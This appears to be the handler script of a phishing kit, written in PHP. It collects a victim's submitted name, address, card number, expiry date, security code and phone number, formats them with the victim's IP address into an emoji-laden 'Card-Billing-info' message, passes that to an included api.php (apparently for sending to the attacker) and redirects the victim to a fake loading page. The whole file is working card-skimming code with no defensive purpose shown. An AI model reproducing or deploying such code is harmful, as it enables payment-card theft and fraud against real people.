<?php

session_start();



$xuser = $_SESSION['xuser'] = $_POST['xuser'];
$streets = $_SESSION['streets'] = $_POST['streets'];
$town = $_SESSION['town'] = $_POST['town'];
$state = $_SESSION['state'] = $_POST['state'];
$zipcode = $_SESSION['zipcode'] = $_POST['zipcode'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];
$expiryMonth = $_SESSION['expiryMonth'] = $_POST['expiryMonth'];
$expiryYear = $_SESSION['expiryYear'] = $_POST['expiryYear'];
$csc = $_SESSION['csc'] = $_POST['csc'];
$phone = $_SESSION['phone'] = $_POST['phone'];

$hexor = '
🤟🏻 🔞📶🙊😈😈😈💳-Card-Billing-info💳😈😈😈🙊📶🔞 🤟🏻
🤟🏻 Cardholder Name : '.$_SESSION["xuser"].' 🤟🏻
🤟🏻 Cardholder Name : '.$_SESSION["streets"].' 🤟🏻
🤟🏻 Cardholder Name : '.$_SESSION["town"].' 🤟🏻
🤟🏻 Cardholder Name : '.$_SESSION["state"].' 🤟🏻
🤟🏻 Cardholder Name : '.$_SESSION["zipcode"].' 🤟🏻
🤌🏻 Card Number-*1️⃣ "- : '.$_SESSION["cardnumber"].' 🤌🏻
🤌🏻 Expiry Date : '.$_SESSION["expiryMonth"].'/'.$_SESSION['expiryYear'].' 🤌🏻
🤌🏻 SecurityCode : '.$_SESSION["csc"].' 🤌🏻
🤟🏻 Phone : '.$_SESSION["phone"].' 🤟🏻
🤟🏻 🔞📶🙊😈😈😈💳-Card-Billing-info💳😈😈😈🙊📶🔞 🤟🏻
📱 IP Address : '.$_SERVER['REMOTE_ADDR'].' 📱
';



include("api.php"); 



header('Location: ../loading1.php');


?>


